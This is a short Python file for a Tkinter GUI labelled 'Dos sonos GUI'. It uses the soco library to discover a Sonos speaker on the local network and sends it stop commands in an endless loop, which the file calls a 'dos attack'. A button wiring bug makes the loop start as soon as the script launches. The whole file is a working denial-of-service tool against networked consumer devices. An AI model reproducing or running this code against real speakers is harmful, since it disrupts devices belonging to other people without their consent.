
# File for GUI version code.

from tkinter import *
import soco

root = Tk()
root.title("Dos sonos GUI")
root.geometry("600x800")

def start_dos():
    device = soco.discovery.any_soco()
    while len(str(device)) != 0:
        print("Currently dossing device::  ", device)
        device.stop()
    if len(str(device)) == 0:
        print("Check if the device is up and running on the network")

button_start = Button(root, text="start dos attack", command=start_dos()).pack()

button_exit = Button(root, text="EXIT ", command=exit).pack()

root.mainloop()